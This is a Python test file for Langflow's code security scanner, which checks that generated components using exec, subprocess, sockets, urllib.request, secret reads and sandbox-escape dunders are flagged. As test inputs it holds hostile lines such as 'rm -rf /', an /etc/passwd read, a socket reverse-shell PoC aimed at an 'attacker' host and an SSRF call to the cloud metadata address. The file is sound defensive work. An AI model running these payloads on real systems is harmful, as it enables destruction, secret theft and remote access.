"""Tests for code security scanning.

Tests cover:
- Safe component code that should pass
- Dangerous function calls (exec, eval, os.system, subprocess, etc.)
- Dangerous imports
- Edge cases (syntax errors, empty code)
"""

from langflow.agentic.helpers.code_security import scan_code_security


class TestScanCodeSecuritySafeCode:
    """Tests that safe component code passes the security scan."""

    def test_should_pass_basic_component(self):
        """Basic Langflow component should pass."""
        code = """
from lfx.custom import Component
from lfx.io import MessageTextInput, Output
from lfx.schema import Data

class MyComponent(Component):
    display_name = "My Component"
    inputs = [MessageTextInput(name="text", display_name="Text")]
    outputs = [Output(name="result", display_name="Result", method="build")]

    def build(self) -> Data:
        return Data(data={"text": self.text})
"""
        result = scan_code_security(code)
        assert result.is_safe is True
        assert result.violations == ()

    def test_should_pass_os_path_usage(self):
        """os.path operations are safe and should pass."""
        code = """
import os
path = os.path.join("a", "b")
exists = os.path.exists(path)
"""
        result = scan_code_security(code)
        assert result.is_safe is True

    def test_should_pass_http_requests(self):
        """Standard HTTP requests library should pass."""
        code = """
import requests
response = requests.get("https://api.example.com/data")
"""
        result = scan_code_security(code)
        assert result.is_safe is True

    def test_should_pass_json_operations(self):
        """JSON operations should pass."""
        code = """
import json
data = json.loads('{"key": "value"}')
result = json.dumps(data)
"""
        result = scan_code_security(code)
        assert result.is_safe is True

    def test_should_pass_math_operations(self):
        """Math operations should pass."""
        code = """
import math
result = math.sqrt(16)
"""
        result = scan_code_security(code)
        assert result.is_safe is True


class TestScanCodeSecurityDangerousCalls:
    """Tests that dangerous function calls are detected."""

    def test_should_detect_exec(self):
        """exec() call should be detected."""
        code = 'exec("print(1)")'
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("exec()" in v for v in result.violations)

    def test_should_detect_eval(self):
        """eval() call should be detected."""
        code = 'result = eval("1+1")'
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("eval()" in v for v in result.violations)

    def test_should_detect_compile(self):
        """compile() call should be detected."""
        code = 'code = compile("print(1)", "<string>", "exec")'
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("compile()" in v for v in result.violations)

    def test_should_detect_dunder_import(self):
        """__import__() call should be detected."""
        code = 'mod = __import__("os")'
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("__import__()" in v for v in result.violations)

    def test_should_detect_globals(self):
        """globals() call should be detected."""
        code = "g = globals()"
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("globals()" in v for v in result.violations)


class TestScanCodeSecurityDangerousAttrCalls:
    """Tests that dangerous attribute calls (module.method) are detected."""

    def test_should_detect_os_system(self):
        """os.system() should be detected."""
        code = 'import os\nos.system("rm -rf /")'
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.system()" in v for v in result.violations)

    def test_should_detect_os_popen(self):
        """os.popen() should be detected."""
        code = 'import os\nos.popen("ls")'
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("os.popen()" in v for v in result.violations)

    def test_should_detect_os_remove(self):
        """os.remove() should be detected."""
        code = 'import os\nos.remove("/tmp/file")'
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_detect_subprocess_run(self):
        """subprocess.run() should be detected."""
        code = 'import subprocess\nsubprocess.run(["ls"])'
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_detect_subprocess_popen(self):
        """subprocess.Popen() should be detected."""
        code = 'import subprocess\nsubprocess.Popen(["ls"])'
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_detect_shutil_rmtree(self):
        """shutil.rmtree() should be detected."""
        code = 'import shutil\nshutil.rmtree("/tmp")'
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_detect_sys_exit(self):
        """sys.exit() should be detected."""
        code = "import sys\nsys.exit(1)"
        result = scan_code_security(code)
        assert result.is_safe is False


class TestScanCodeSecurityDangerousImports:
    """Tests that dangerous imports are detected."""

    def test_should_detect_subprocess_import(self):
        """Import subprocess should be detected."""
        code = "import subprocess"
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("subprocess" in v for v in result.violations)

    def test_should_detect_shutil_import(self):
        """Import shutil should be detected."""
        code = "import shutil"
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_detect_pickle_import(self):
        """Import pickle should be detected."""
        code = "import pickle"
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_detect_ctypes_import(self):
        """Import ctypes should be detected."""
        code = "import ctypes"
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_detect_from_subprocess_import(self):
        """From subprocess import run should be detected."""
        code = "from subprocess import run"
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_detect_restricted_os_import(self):
        """From os import system should be detected."""
        code = "from os import system"
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_allow_os_path_import(self):
        """From os import path should be allowed."""
        code = "from os import path"
        result = scan_code_security(code)
        assert result.is_safe is True

    def test_should_allow_os_import_itself(self):
        """Import os alone should pass (specific functions are blocked)."""
        code = "import os"
        result = scan_code_security(code)
        assert result.is_safe is True


class TestScanCodeSecurityMultipleViolations:
    """Tests detection of multiple violations in the same code."""

    def test_should_report_all_violations(self):
        """Should report all violations, not just the first one."""
        code = 'import subprocess\nexec("x")\neval("y")'
        result = scan_code_security(code)
        assert result.is_safe is False
        assert len(result.violations) >= 3

    def test_should_detect_import_and_call_violations(self):
        """Should detect both dangerous import and dangerous call."""
        code = 'import shutil\nos.system("cmd")'
        result = scan_code_security(code)
        assert result.is_safe is False
        assert len(result.violations) >= 2


class TestScanCodeSecurityEdgeCases:
    """Tests edge cases and boundary conditions."""

    def test_should_handle_syntax_error_gracefully(self):
        """Syntax errors should return is_safe=True (handled by validation.py)."""
        result = scan_code_security("def foo(:\n  pass")
        assert result.is_safe is True

    def test_should_handle_empty_code(self):
        """Empty code should return is_safe=True."""
        result = scan_code_security("")
        assert result.is_safe is True

    def test_should_handle_whitespace_only(self):
        """Whitespace-only code should return is_safe=True."""
        result = scan_code_security("   \n\n  ")
        assert result.is_safe is True

    def test_should_handle_none_like_empty(self):
        """Code with no dangerous patterns should pass."""
        result = scan_code_security("x = 1\ny = 2\nz = x + y")
        assert result.is_safe is True

    def test_violations_is_tuple(self):
        """Violations should be a tuple (immutable)."""
        result = scan_code_security("exec('x')")
        assert isinstance(result.violations, tuple)


class TestScanCodeSecurityExfiltrationAndEscapes:
    """Guardrails for malicious generated components (user-requested).

    Secret/env exfiltration and sandbox-escape via dunders are the real
    threats. We block those WITHOUT banning all HTTP (legit API
    components need `requests`) — surgical and low-false-positive.
    """

    def test_should_detect_os_environ_secret_read(self):
        result = scan_code_security('import os\nk = os.environ["OPENAI_API_KEY"]')
        assert result.is_safe is False

    def test_should_detect_os_getenv_secret_read(self):
        result = scan_code_security('import os\nk = os.getenv("OPENAI_API_KEY")')
        assert result.is_safe is False

    def test_should_detect_raw_open_file_access(self):
        result = scan_code_security('data = open("/etc/passwd").read()')
        assert result.is_safe is False

    def test_should_detect_subclasses_sandbox_escape(self):
        result = scan_code_security("evil = ().__class__.__bases__[0].__subclasses__()")
        assert result.is_safe is False

    def test_should_detect_func_globals_escape(self):
        result = scan_code_security("def f():\n    pass\ng = f.__globals__")
        assert result.is_safe is False

    def test_should_detect_builtins_escape(self):
        result = scan_code_security("def f():\n    pass\nb = f.__builtins__")
        assert result.is_safe is False

    # --- no-regression: legitimate patterns must still pass ---

    def test_should_still_allow_http_requests(self):
        # HTTP is a core legit use case — must NOT be banned.
        result = scan_code_security('import requests\nr = requests.get("https://api.example.com")')
        assert result.is_safe is True

    def test_should_still_allow_os_path(self):
        result = scan_code_security('import os\np = os.path.join("a", "b")')
        assert result.is_safe is True

    def test_should_still_allow_getattr(self):
        # getattr is common/legit — banning it would regress real components.
        result = scan_code_security('v = getattr(self, "field", None)')
        assert result.is_safe is True


class TestScanCodeSecurityNetworkImports:
    """Regression for CVE-2026-33873 incomplete fix (H1-3773010).

    Raw-socket / non-HTTP-protocol / shell-spawning stdlib modules enable the
    same attack class as ``subprocess`` (reverse shells, SSRF, raw exfil) and
    must be blocked. High-level HTTP via ``requests`` stays allowed by design
    (legit API components need it), as do the safe ``urllib.parse`` /
    ``http.HTTPStatus`` siblings.
    """

    def test_should_detect_socket_import(self):
        """Import socket — raw-socket reverse shell / exfil primitive."""
        result = scan_code_security("import socket")
        assert result.is_safe is False
        assert any("socket" in v for v in result.violations)

    def test_should_detect_from_socket_import(self):
        result = scan_code_security("from socket import socket")
        assert result.is_safe is False

    def test_should_detect_socketserver_import(self):
        result = scan_code_security("import socketserver")
        assert result.is_safe is False

    def test_should_detect_urllib_request_import(self):
        """Import urllib.request — SSRF + file:// local read bypass."""
        result = scan_code_security("import urllib.request")
        assert result.is_safe is False
        assert any("urllib.request" in v for v in result.violations)

    def test_should_detect_from_urllib_request_import(self):
        result = scan_code_security("from urllib.request import urlopen")
        assert result.is_safe is False

    def test_should_detect_from_urllib_import_request_submodule(self):
        """`from urllib import request` must also be caught."""
        result = scan_code_security("from urllib import request")
        assert result.is_safe is False

    def test_should_detect_urllib_error_import(self):
        result = scan_code_security("import urllib.error")
        assert result.is_safe is False

    def test_should_detect_http_client_import(self):
        result = scan_code_security("import http.client")
        assert result.is_safe is False

    def test_should_detect_from_http_client_import(self):
        result = scan_code_security("from http.client import HTTPConnection")
        assert result.is_safe is False

    def test_should_detect_from_http_import_client_submodule(self):
        result = scan_code_security("from http import client")
        assert result.is_safe is False

    def test_should_detect_ftplib_import(self):
        result = scan_code_security("import ftplib")
        assert result.is_safe is False

    def test_should_detect_smtplib_import(self):
        result = scan_code_security("import smtplib")
        assert result.is_safe is False

    def test_should_detect_telnetlib_import(self):
        result = scan_code_security("import telnetlib")
        assert result.is_safe is False

    def test_should_detect_poplib_import(self):
        result = scan_code_security("import poplib")
        assert result.is_safe is False

    def test_should_detect_imaplib_import(self):
        result = scan_code_security("import imaplib")
        assert result.is_safe is False

    def test_should_detect_xmlrpc_import(self):
        result = scan_code_security("from xmlrpc import client")
        assert result.is_safe is False

    def test_should_detect_pty_import(self):
        """Import pty — interactive reverse-shell spawning (Scenario D)."""
        result = scan_code_security("import pty")
        assert result.is_safe is False

    def test_should_detect_os_dup2_call(self):
        """os.dup2() — fd redirection used to wire a socket to a shell."""
        result = scan_code_security("import os\nos.dup2(3, 0)")
        assert result.is_safe is False
        assert any("dup2" in v for v in result.violations)

    def test_should_detect_from_os_import_dup2(self):
        result = scan_code_security("from os import dup2")
        assert result.is_safe is False

    # --- reporter PoC payloads (H1-3773010) ---

    def test_should_block_reporter_socket_reverse_shell_poc(self):
        code = "import socket\ns = socket.socket()\ns.connect(('attacker', 4444))"
        result = scan_code_security(code)
        assert result.is_safe is False

    def test_should_block_reporter_urllib_ssrf_poc(self):
        code = "import urllib.request\nurllib.request.urlopen('http://169.254.169.254/latest/meta-data/')"
        result = scan_code_security(code)
        assert result.is_safe is False

    # --- no-regression: HTTP + safe siblings must still pass ---

    def test_should_still_allow_requests(self):
        result = scan_code_security('import requests\nr = requests.get("https://api.example.com")')
        assert result.is_safe is True

    def test_should_allow_urllib_parse(self):
        """urllib.parse (urlencode/quote) is a common, safe API helper."""
        result = scan_code_security("from urllib.parse import urlencode\nq = urlencode({'a': 1})")
        assert result.is_safe is True

    def test_should_allow_urllib_parse_module_import(self):
        result = scan_code_security("import urllib.parse")
        assert result.is_safe is True

    def test_should_allow_http_httpstatus(self):
        """From http import HTTPStatus is legitimate and must not be flagged."""
        result = scan_code_security("from http import HTTPStatus\ns = HTTPStatus.OK")
        assert result.is_safe is True

    def test_should_allow_bare_http_import(self):
        result = scan_code_security("import http")
        assert result.is_safe is True


class TestScanCodeSecurityAliasAndWildcardBypass:
    """Evasion via import aliases / wildcard imports must not slip past.

    ``os``/``sys`` are importable as whole modules (only specific members are
    restricted), so aliasing or wildcard-importing them used to bypass the
    attribute-call / restricted-name checks. The scanner now resolves aliases
    and treats wildcard-imported members as direct attribute access.
    """

    # --- import alias bypass: `import os as o; o.<restricted>()` ---

    def test_should_detect_aliased_os_dup2(self):
        result = scan_code_security("import os as o\no.dup2(3, 0)")
        assert result.is_safe is False
        assert any("dup2" in v for v in result.violations)

    def test_should_detect_aliased_os_system(self):
        result = scan_code_security("import os as o\no.system('id')")
        assert result.is_safe is False

    def test_should_detect_aliased_sys_exit(self):
        result = scan_code_security("import sys as y\ny.exit(1)")
        assert result.is_safe is False

    def test_should_detect_aliased_os_environ_read(self):
        result = scan_code_security("import os as o\nk = o.environ['SECRET']")
        assert result.is_safe is False

    def test_should_detect_aliased_os_getenv(self):
        result = scan_code_security("import os as o\nk = o.getenv('SECRET')")
        assert result.is_safe is False

    def test_should_detect_dotted_alias_os_path(self):
        """`import os.path as p` still binds top-level `os`; p.system() is os.system()."""
        result = scan_code_security("import os.path as p\np.system('id')")
        assert result.is_safe is False

    # --- wildcard import bypass: `from os import *; <restricted>()` ---

    def test_should_detect_wildcard_os_dup2(self):
        result = scan_code_security("from os import *\ndup2(3, 0)")
        assert result.is_safe is False
        assert any("dup2" in v for v in result.violations)

    def test_should_detect_wildcard_os_system(self):
        result = scan_code_security("from os import *\nsystem('id')")
        assert result.is_safe is False

    def test_should_detect_wildcard_os_environ_read(self):
        result = scan_code_security("from os import *\nk = environ['SECRET']")
        assert result.is_safe is False

    # --- no-regression: aliases/wildcards of safe members must still pass ---

    def test_should_allow_aliased_os_path(self):
        result = scan_code_security("import os as o\np = o.path.join('a', 'b')")
        assert result.is_safe is True

    def test_should_allow_aliased_requests(self):
        result = scan_code_security("import requests as r\nr.get('https://api.example.com')")
        assert result.is_safe is True

    def test_should_allow_wildcard_os_safe_member(self):
        """`from os import *` then a non-restricted member (getcwd) is fine."""
        result = scan_code_security("from os import *\nd = getcwd()")
        assert result.is_safe is True


class TestScanCodeSecurityDottedSubmoduleAccess:
    """Bare-package imports must not reach a blocked submodule via dotted access.

    A bare ``import urllib`` / ``import http`` is allowed (the package root is
    safe), but at runtime ``urllib.request`` / ``http.client`` are already
    preloaded, so ``urllib.request.urlopen(...)`` works without an explicit
    submodule import. The scanner flags the dotted access itself. Safe siblings
    (``urllib.parse``, ``http.HTTPStatus``, ``os.path``) stay allowed.
    """

    def test_should_detect_bare_urllib_then_request_call(self):
        code = "import urllib\nurllib.request.urlopen('http://169.254.169.254/latest/meta-data/')"
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("urllib.request" in v for v in result.violations)

    def test_should_detect_bare_http_then_client(self):
        code = "import http\nc = http.client.HTTPConnection('attacker', 80)"
        result = scan_code_security(code)
        assert result.is_safe is False
        assert any("http.client" in v for v in result.violations)

    def test_should_detect_urllib_request_access_without_import(self):
        """Relying on the runtime preload — no import statement at all."""
        result = scan_code_security("urllib.request.urlopen('http://x')")
        assert result.is_safe is False

    def test_should_detect_aliased_bare_urllib_submodule(self):
        result = scan_code_security("import urllib as u\nu.request.urlopen('http://x')")
        assert result.is_safe is False

    def test_should_detect_submodule_assignment(self):
        """Binding the submodule object is just as dangerous as calling through it."""
        result = scan_code_security("import urllib\nreq = urllib.request")
        assert result.is_safe is False

    def test_should_report_single_violation_for_chain(self):
        """One dotted chain → exactly one submodule violation (no double-flag)."""
        result = scan_code_security("import urllib\nurllib.request.urlopen('http://x')")
        submod_hits = [v for v in result.violations if "urllib.request" in v]
        assert len(submod_hits) == 1

    # --- no-regression: safe dotted access on mixed packages ---

    def test_should_allow_urllib_parse_dotted_access(self):
        result = scan_code_security("import urllib.parse\nq = urllib.parse.urlencode({'a': 1})")
        assert result.is_safe is True

    def test_should_allow_http_httpstatus_dotted_access(self):
        result = scan_code_security("import http\nx = http.HTTPStatus.OK")
        assert result.is_safe is True

    def test_should_allow_os_path_dotted_access(self):
        result = scan_code_security("import os\np = os.path.join('a', 'b')")
        assert result.is_safe is True
